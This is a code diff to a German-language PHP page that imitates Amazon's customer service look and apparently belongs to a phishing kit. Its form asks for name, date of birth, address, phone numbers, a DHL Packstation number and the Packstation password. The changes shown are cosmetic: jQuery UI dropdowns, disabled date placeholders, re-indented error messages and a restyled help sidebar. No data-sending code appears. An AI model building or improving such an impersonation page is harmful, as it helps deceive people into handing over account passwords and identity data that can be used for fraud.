@@ -17,10 +17,12 @@
 		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
 		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
 		<link rel="stylesheet" href="src/font-awesome/css/font-awesome.min.css">
+		<link rel="stylesheet" href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
 		<link rel="stylesheet" href="src/css/custom.css?<?php echo time();?>">
 
 		<link href="src/img/favicon.ico" rel="shortcut icon" />
 		<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
+		<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
 		<script type="text/javascript">
 			$(document).ready(function() {
 				$( "#packstation" ).click(function() { 
@@ -35,9 +37,23 @@
 						$("#ps_passwort").css("display", "none");
 						$("#ps_active").val("0");
 					}
+				});			
+
+				$("form select").each(function() {
+					$(this).selectmenu();
+					if($(this).hasClass("a-form-error")) {
+						var id = $(this).attr('id') + "-button";
+						$("#" + id).addClass("a-form-error");
+					}
 				});
 			});
 		</script>
+
+		<style>
+			.ui-selectmenu-menu ul {
+				max-height: 300px;
+			}		
+		</style>
 	</head>
 	
 	<body class="a-meter-animate">
@@ -244,14 +260,14 @@
 
 															<?php if(isset($_SESSION['errList']['vorname'])) { ?>
 																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
-																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
-																        <div class="a-box-inner a-alert-container">
-																            <i class="a-icon a-icon-alert"></i>
-																            <div class="a-alert-content">
-																                <div class="a-section"><?php echo $_SESSION['errList']['vorname'];?></div>
-																            </div>
-																        </div>
-																    </div>
+																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																		<div class="a-box-inner a-alert-container">
+																			<i class="a-icon a-icon-alert"></i>
+																			<div class="a-alert-content">
+																				<div class="a-section"><?php echo $_SESSION['errList']['vorname'];?></div>
+																			</div>
+																		</div>
+																	</div>
 																</div>
 															<?php } ?>			
 														</td>
@@ -264,14 +280,14 @@
 
 															<?php if(isset($_SESSION['errList']['nachname'])) { ?>
 																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
-																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
-																        <div class="a-box-inner a-alert-container">
-																            <i class="a-icon a-icon-alert"></i>
-																            <div class="a-alert-content">
-																                <div class="a-section"><?php echo $_SESSION['errList']['nachname'];?></div>
-																            </div>
-																        </div>
-																    </div>
+																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																		<div class="a-box-inner a-alert-container">
+																			<i class="a-icon a-icon-alert"></i>
+																			<div class="a-alert-content">
+																				<div class="a-section"><?php echo $_SESSION['errList']['nachname'];?></div>
+																			</div>
+																		</div>
+																	</div>
 																</div>
 															<?php } ?>															
 														</td>
@@ -283,10 +299,10 @@
 														
 															  <?php	
 																if (isset($_SESSION['dob1_err'])) {
-																	echo '<select class="a-select-multiple a-form-error" style="border-radius: 3px 0px 0px 3px;width:72px;padding:4px" id="dob1" name="dob1"><option value="Tag">Tag</option>';
+																	echo '<select class="a-select-multiple a-form-error" style="border-radius: 3px 0px 0px 3px;width:72px;padding:4px" id="dob1" name="dob1"><option value="Tag" disabled selected>Tag</option>';
 																	unset($_SESSION['dob1_err']);
 																} else {
-																	echo '<select style="border:1px solid #a6a6a6;border-radius: 3px 0px 0px 3px;width:72px;padding:4px;border-top-color: #949494" id="dob1" name="dob1"><option value="Tag">Tag</option>';
+																	echo '<select style="border:1px solid #a6a6a6;border-radius: 3px 0px 0px 3px;width:72px;padding:4px;border-top-color: #949494" id="dob1" name="dob1"><option value="Tag" disabled selected>Tag</option>';
 																}
 																
 																for ($i = 1; $i <= 31; $i++) {
@@ -307,10 +323,10 @@
 															
 															<?php
 																if (isset($_SESSION['dob2_err'])) {
-																	echo '<select class="a-select-multiple a-form-error" style="width:72px;padding:4px" id="dob2" name="dob2"><option value="Monat">Monat</option>';
+																	echo '<select class="a-select-multiple a-form-error" style="width:72px;padding:4px" id="dob2" name="dob2"><option value="Monat" disabled selected>Monat</option>';
 																	unset($_SESSION['dob2_err']);
 																} else {
-																	echo '<select style="border:1px solid #a6a6a6;width:72px;padding:4px;border-top-color: #949494" id="dob2" name="dob2"><option value="Monat">Monat</option>';
+																	echo '<select style="border:1px solid #a6a6a6;width:72px;padding:4px;border-top-color: #949494" id="dob2" name="dob2"><option value="Monat" disabled selected>Monat</option>';
 																}
 																
 																for ($i = 1; $i <= 12; $i++) {
@@ -331,10 +347,10 @@
 															
 															<?php
 																if (isset($_SESSION['dob3_err'])) {
-																	echo '<select class="a-select-multiple a-form-error" style="width:72px;padding:4px" id="dob3" name="dob3"><option value="Jahr">Jahr</option>';
+																	echo '<select class="a-select-multiple a-form-error" style="width:72px;padding:4px" id="dob3" name="dob3"><option value="Jahr" disabled selected>Jahr</option>';
 																	unset($_SESSION['dob3_err']);
 																} else {
-																	echo '<select style="border:1px solid #a6a6a6;width:72px;padding:4px;border-top-color: #949494" id="dob3" name="dob3"><option value="Jahr">Jahr</option>';
+																	echo '<select style="border:1px solid #a6a6a6;width:72px;padding:4px;border-top-color: #949494" id="dob3" name="dob3"><option value="Jahr" disabled selected>Jahr</option>';
 																}
 																
 																$year = date("Y");
@@ -354,14 +370,14 @@
 
 															<?php if(isset($_SESSION['errList']['dob'])) { ?>
 																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
-																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
-																        <div class="a-box-inner a-alert-container">
-																            <i class="a-icon a-icon-alert"></i>
-																            <div class="a-alert-content">
-																                <div class="a-section"><?php echo $_SESSION['errList']['dob'];?></div>
-																            </div>
-																        </div>
-																    </div>
+																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																		<div class="a-box-inner a-alert-container">
+																			<i class="a-icon a-icon-alert"></i>
+																			<div class="a-alert-content">
+																				<div class="a-section"><?php echo $_SESSION['errList']['dob'];?></div>
+																			</div>
+																		</div>
+																	</div>
 																</div>
 															<?php } ?>														
 														</td>
@@ -374,14 +390,14 @@
 
 															<?php if(isset($_SESSION['errList']['adresse'])) { ?>
 																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
-																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
-																        <div class="a-box-inner a-alert-container">
-																            <i class="a-icon a-icon-alert"></i>
-																            <div class="a-alert-content">
-																                <div class="a-section"><?php echo $_SESSION['errList']['adresse'];?></div>
-																            </div>
-																        </div>
-																    </div>
+																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																		<div class="a-box-inner a-alert-container">
+																			<i class="a-icon a-icon-alert"></i>
+																			<div class="a-alert-content">
+																				<div class="a-section"><?php echo $_SESSION['errList']['adresse'];?></div>
+																			</div>
+																		</div>
+																	</div>
 																</div>
 															<?php } ?>															
 														</td>
@@ -394,14 +410,14 @@
 
 															<?php if(isset($_SESSION['errList']['plz'])) { ?>
 																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
-																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
-																        <div class="a-box-inner a-alert-container">
-																            <i class="a-icon a-icon-alert"></i>
-																            <div class="a-alert-content">
-																                <div class="a-section"><?php echo $_SESSION['errList']['plz'];?></div>
-																            </div>
-																        </div>
-																    </div>
+																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																		<div class="a-box-inner a-alert-container">
+																			<i class="a-icon a-icon-alert"></i>
+																			<div class="a-alert-content">
+																				<div class="a-section"><?php echo $_SESSION['errList']['plz'];?></div>
+																			</div>
+																		</div>
+																	</div>
 																</div>
 															<?php } ?>															
 														</td>
@@ -414,14 +430,14 @@
 
 															<?php if(isset($_SESSION['errList']['ort'])) { ?>
 																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
-																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
-																        <div class="a-box-inner a-alert-container">
-																            <i class="a-icon a-icon-alert"></i>
-																            <div class="a-alert-content">
-																                <div class="a-section"><?php echo $_SESSION['errList']['ort'];?></div>
-																            </div>
-																        </div>
-																    </div>
+																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																		<div class="a-box-inner a-alert-container">
+																			<i class="a-icon a-icon-alert"></i>
+																			<div class="a-alert-content">
+																				<div class="a-section"><?php echo $_SESSION['errList']['ort'];?></div>
+																			</div>
+																		</div>
+																	</div>
 																</div>
 															<?php } ?>																
 														</td>
@@ -434,14 +450,14 @@
 
 															<?php if(isset($_SESSION['errList']['tlfnr'])) { ?>
 																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
-																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
-																        <div class="a-box-inner a-alert-container">
-																            <i class="a-icon a-icon-alert"></i>
-																            <div class="a-alert-content">
-																                <div class="a-section"><?php echo $_SESSION['errList']['tlfnr'];?></div>
-																            </div>
-																        </div>
-																    </div>
+																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																		<div class="a-box-inner a-alert-container">
+																			<i class="a-icon a-icon-alert"></i>
+																			<div class="a-alert-content">
+																				<div class="a-section"><?php echo $_SESSION['errList']['tlfnr'];?></div>
+																			</div>
+																		</div>
+																	</div>
 																</div>
 															<?php } ?>															
 														</td>
@@ -454,14 +470,14 @@
 
 															<?php if(isset($_SESSION['errList']['handynr'])) { ?>
 																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
-																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
-																        <div class="a-box-inner a-alert-container">
-																            <i class="a-icon a-icon-alert"></i>
-																            <div class="a-alert-content">
-																                <div class="a-section"><?php echo $_SESSION['errList']['handynr'];?></div>
-																            </div>
-																        </div>
-																    </div>
+																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																		<div class="a-box-inner a-alert-container">
+																			<i class="a-icon a-icon-alert"></i>
+																			<div class="a-alert-content">
+																				<div class="a-section"><?php echo $_SESSION['errList']['handynr'];?></div>
+																			</div>
+																		</div>
+																	</div>
 																</div>
 															<?php } ?>																
 														</td>
@@ -480,23 +496,24 @@
 													<tr id="ps_nummer" style="display:<?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "table-row" : "none") ?>">
 														<td style="padding-bottom:7px"><b><label style="font-size:13px">PostNummer:</label></b></td>
 														<td style="padding-bottom:7px">
-															<input id="ps_nr" name="ps_nr" value="<?php echo (isset($_SESSION['ps_nr']) ? $_SESSION['ps_nr'] : ""); ?>" autocomplete="off" maxlength="15" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['ps_nr_err']) ? "a-form-error" : ""); ?>">
-															<div id='box' style="margin-left:10px;float:right">
+															<input id="ps_nr" name="ps_nr" value="<?php echo (isset($_SESSION['ps_nr']) ? $_SESSION['ps_nr'] : ""); ?>" autocomplete="off" maxlength="15" type="text" style="height:18px;width:250px;" class="pull-left <?php echo (isset($_SESSION['ps_nr_err']) ? "a-form-error" : ""); ?>">
+															<div id='box' class='pull-left'>
 																<a href='#' class="cvvIcon">
-																	<span style="left:35%;top:60%;width:306px;height:196px"><img src="src/img/dhlgoldcard.jpg"/></span>
+																	<span style="left:0;margin-left:-330px;top:60%;width:306px;height:196px"><img src="src/img/dhlgoldcard.jpg"/></span>
 																</a>
 															</div>
+															<div class="clearfix"></div>
 
 															<?php if(isset($_SESSION['errList']['ps_nr'])) { ?>
 																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
-																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
-																        <div class="a-box-inner a-alert-container">
-																            <i class="a-icon a-icon-alert"></i>
-																            <div class="a-alert-content">
-																                <div class="a-section"><?php echo $_SESSION['errList']['ps_nr'];?></div>
-																            </div>
-																        </div>
-																    </div>
+																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																		<div class="a-box-inner a-alert-container">
+																			<i class="a-icon a-icon-alert"></i>
+																			<div class="a-alert-content">
+																				<div class="a-section"><?php echo $_SESSION['errList']['ps_nr'];?></div>
+																			</div>
+																		</div>
+																	</div>
 																</div>
 															<?php } ?>																
 														</td>
@@ -508,14 +525,14 @@
 
 															<?php if(isset($_SESSION['errList']['ps_pw'])) { ?>
 																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
-																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
-																        <div class="a-box-inner a-alert-container">
-																            <i class="a-icon a-icon-alert"></i>
-																            <div class="a-alert-content">
-																                <div class="a-section"><?php echo $_SESSION['errList']['ps_pw'];?></div>
-																            </div>
-																        </div>
-																    </div>
+																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																		<div class="a-box-inner a-alert-container">
+																			<i class="a-icon a-icon-alert"></i>
+																			<div class="a-alert-content">
+																				<div class="a-section"><?php echo $_SESSION['errList']['ps_pw'];?></div>
+																			</div>
+																		</div>
+																	</div>
 																</div>
 															<?php } ?>	
 														</td>
@@ -550,150 +567,114 @@
 						<div class="rightcol">
 							<div class="a-section cs-help-sidebar-module take-action-sidebar">
 								<div class="a-section inner">
-									
-								<div class="cu_self_service_quick_sol_title cu_self_service_quick_sol_title_default" style="display: block;">
-									<h3>
-										Schnelle Lösungen
-									</h3>
-								</div>
-								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
-									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
-										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
-											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
-												<a class="a-link-normal" href="#">
-													<img alt="" src="src/img/Box_smaller.png" width="46">
-												</a>
-											</div>
-											<div class="a-spacing-top-mini a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
-												<a class="a-link-normal quick-solution-action" href="#">
-													<p class="a-spacing-none a-size-base a-color-base">
-														Meine Bestellungen
-													</p>
-														<p class="a-size-small a-color-base">
-															Nachverfolgen &amp; zurücksenden
-														</p>
-												</a>
-											</div>
-										</div></div>
-									</div>
-								</div>
-								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
-									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
-										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
-											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
-												<a class="a-link-normal" href="#">
-													<img alt="" src="src/img/Devices_clear-bg.png" width="46">
-												</a>
-											</div>
-											<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
-												<a class="a-link-normal quick-solution-action" href="#">
-													<p class="a-spacing-none a-size-base a-color-base">
-														Geräte &amp; Inhalte
-													</p>
-												</a>
-											</div>
-										</div></div>
-									</div>
-								</div>
+									<div data-card-identifier="DigitalContentAndDevices" class="a-box ya-card">
+										<div class="a-box-inner">
+											<h4 class="a-spacing-micro">Schnelle Lösungen</h4>
+											<ul class="a-unordered-list a-nostyle a-vertical">
+												<li class="a-spacing-micro-custom">
+													<span class="a-list-item">													
+														<div class="a-fixed-left-grid">
+															<div class="a-fixed-left-grid-inner" style="padding-left:46px">
+																<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
+																	<a class="a-link-normal" href="#">
+																		<img alt="" src="src/img/Box_smaller.png" width="46">
+																	</a>
+																</div>
+																<div class="a-spacing-top-mini a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
+																	<a style="line-height: 15px; margin-top: 2px;display: inline-block;font-size: 13px;" class="a-link-normal quick-solution-action" href="#">Meine Bestellungen<br/>Nachverfolgen &amp; zurücksenden</a>
+																</div>
+															</div>
+														</div>														
+													</span>
+												</li>
+												<li class="a-spacing-micro-custom">
+													<span class="a-list-item">
+														<div class="a-fixed-left-grid">
+															<div class="a-fixed-left-grid-inner" style="padding-left:46px">
+																<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
+																	<a class="a-link-normal" href="#">
+																		<img alt="" src="src/img/Devices_clear-bg.png" width="46">
+																	</a>
+																</div>
+																<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
+																	<a class="a-link-normal quick-solution-action a-size-base" href="#">Geräte &amp; Inhalte</a>
+																</div>
+															</div>
+														</div>
+													</span>
+												</li>
+												<li class="a-spacing-micro-custom">
+													<span class="a-list-item">
+														<div class="a-fixed-left-grid">
+															<div class="a-fixed-left-grid-inner" style="padding-left:46px">
+																<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
+																	<a class="a-link-normal" href="#">
+																		<img alt="" src="src/img/Prime_clear-bg.png" width="46">
+																	</a>
+																</div>
+																<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
+																	<a class="a-link-normal quick-solution-action a-size-base" href="#">Prime-Mitgliedschaft</a>
+																</div>
+															</div>
+														</div>
+													</span>
+												</li>
+												<li class="a-spacing-micro-custom">
+													<span class="a-list-item">
+														<div class="a-fixed-left-grid">
+															<div class="a-fixed-left-grid-inner" style="padding-left:46px">
+																<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
+																	<a class="a-link-normal" href="#">
+																		<img alt="" src="src/img/Payments_clear-bg.png" width="46">
+																	</a>
+																</div>
+																<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
+																	<a class="a-link-normal quick-solution-action a-size-base" href="#">Zahlungseinstellungen</a>
+																</div>
+															</div>
+														</div>
+													</span>
+												</li>
+											</ul>
+										</div>
+									</div>									
 
-								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
-									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
-										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
-											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
-												<a class="a-link-normal" href="#">
-													<img alt="" src="src/img/Prime_clear-bg.png" width="46">
-												</a>
-											</div>
-											<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
-												<a class="a-link-normal quick-solution-action" href="#">
-													<p class="a-spacing-none a-size-base a-color-base">
-														Prime-Mitgliedschaft
-													</p>
-												</a>
-											</div>
-										</div></div>
-									</div>
-								</div>
-
-								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
-									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
-										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
-											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
-												<a class="a-link-normal" href="#">
-													<img alt="" src="src/img/Payments_clear-bg.png" width="46">
-												</a>
-											</div>
-											<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
-												<a class="a-link-normal quick-solution-action" href="#">
-													<p class="a-spacing-none a-size-base a-color-base">
-														Zahlungseinstellungen
-													</p>
-												</a>
-											</div>
-										</div></div>
-									</div>
-								</div>
-
-								<hr class="a-divider-normal">
-											
-								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
-									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
-										<div class="a-column a-span12">
-											<a class="a-link-normal quick-solution-action" href="#">
-												<p class="a-spacing-none a-size-base a-color-base">
-												   Artikel zurücksenden oder ersetzen
-											   </p>
-											</a>
+									<div data-card-identifier="DigitalContentAndDevices" class="a-box ya-card" style="margin-top: 20px">
+										<div class="a-box-inner">
+											<h4 class="a-spacing-micro">Digital content and devices</h4>
+											<ul class="a-unordered-list a-nostyle a-vertical">
+												<li class="a-spacing-micro">
+													<span class="a-list-item">
+														<a class="a-link-normal quick-solution-action" href="#">Artikel zurücksenden oder ersetzen</a>
+													</span>
+												</li>
+												<li class="a-spacing-micro">
+													<span class="a-list-item">
+														<a class="a-link-normal quick-solution-action" href="#">Adressbuch verwalten</a>
+													</span>
+												</li>
+												<li>
+													<span class="a-list-item">
+														<a class="a-link-normal quick-solution-action" href="#">Namen, E-Mail-Adresse oder Passwort ändern</a>
+													</span>
+												</li>
+											</ul>
 										</div>
 									</div>
-								</div>
-
-								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
-									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
-										<div class="a-column a-span12">
-											<a class="a-link-normal quick-solution-action" href="#">
-												<p class="a-spacing-none a-size-base a-color-base">
-												   Adressbuch verwalten
-											   </p>
-											</a>
-										</div>
-									</div>
-								</div> 
-								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
-									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
-										<div class="a-column a-span12">
-											<a class="a-link-normal quick-solution-action" href="#">
-												<p class="a-spacing-none a-size-base a-color-base">
-												   Namen, E-Mail-Adresse oder Passwort ändern
-											   </p>
-											</a>
-										</div>
-									</div>
-								</div>
 								</div>
 							</div>
-							<div class="forum_info_links">
-								<div class="cu-rounded">
-									<div class="cu-top">
-										<div class="cu-top-left">
-										</div>
-									</div>
-									<div class="cu-middle">
-										<div class="cs-rounded-content">
-											<h4>Finden Sie die Antwort auf Ihre Frage</h4>
-											<div>
-											   <p>Besuchen Sie unsere Hilfeforen und finden Sie Antworten und hilfreiche Informationen von der Amazon Community.</p>
-											   <div>
-												   
-												   <a href="#" class="w140 cu-forum-info-button cu-forum-info-button amzn-btn btn-sec-med" unselectable="on"><span>Kindle Hilfeforum</span></a>
-											   </div>
-											</div>
-										</div>  
-									</div>
-									<div class="cu-bottom">
-										<div class="cu-bottom-left">
-										</div>
-									</div>
+
+							<div data-card-identifier="DigitalContentAndDevices" class="a-box ya-card" style="margin-top: 20px">
+								<div class="a-box-inner">
+									<h4 class="a-spacing-micro">Finden Sie die Antwort auf Ihre Frage</h4>
+									<div>
+									   <p>Besuchen Sie unsere Hilfeforen und finden Sie Antworten und hilfreiche Informationen von der Amazon Community.</p>
+									   <div>
+											<a href="#">
+												<span class="a-button" id="a-autoid-1"><span class="a-button-inner"><input class="a-button-input" type="button" aria-labelledby="a-autoid-1-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-1-announce"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kindle Hilfeforum</font></font></span></span></span>
+											</a>												   
+									   </div>
+									</div>		
 								</div>
 							</div>
 						</div>
